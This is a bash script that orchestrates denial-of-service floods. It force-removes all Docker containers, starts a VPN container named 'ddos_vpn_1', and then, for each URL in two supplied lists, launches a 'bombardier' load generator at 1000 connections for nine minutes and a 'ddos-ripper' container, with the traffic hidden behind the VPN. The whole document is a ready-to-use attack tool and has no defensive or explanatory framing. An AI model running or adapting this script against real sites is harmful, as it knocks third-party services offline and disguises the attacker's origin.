#!/bin/bash
RESOURCES_FILE_BOMB=$1
INSTANCE_PER_BOMB=$2
RESOURCES_FILE_RIPPER=$3
INSTANCE_PER_RIPPER=$4

echo "Bombardier file: $RESOURCES_FILE_BOMB"
echo "Ripper file: $RESOURCES_FILE_RIPPER"


echo "Killing all running docker instances..."
sudo docker rm -f $(sudo docker ps -aq) >/dev/null 2>&1 || true
sleep 5s
echo "Killed all instances."


echo "Starting VPN (from docker-compose)..."
sudo docker-compose up -d
sleep 15s
echo "VPN started."


echo "Starting Bombardier instances..."
IFS=$'\n' read -d '' -r -a linesbomb < $RESOURCES_FILE_BOMB
for URL in "${linesbomb[@]}"
do
   echo "Starting for $URL"
   {
     sudo docker run -d -m 128m --cpus=2 --rm --net=container:ddos_vpn_1 alpine/bombardier -c 1000 -d 540s -l $URL 
   } &> /dev/null
done
echo "Bombardier instances started."

echo "Starting Ripper instances..."
IFS=$'\n' read -d '' -r -a linesripper < $RESOURCES_FILE_RIPPER
for URL in "${linesripper[@]}"
do
   echo "Starting for $URL"
   {
     sudo docker run -d -m 128m --cpus=2 --rm --net=container:ddos_vpn_1 nitupkcuf/ddos-ripper $URL 
   } &> /dev/null
done
echo "Ripper instances started."
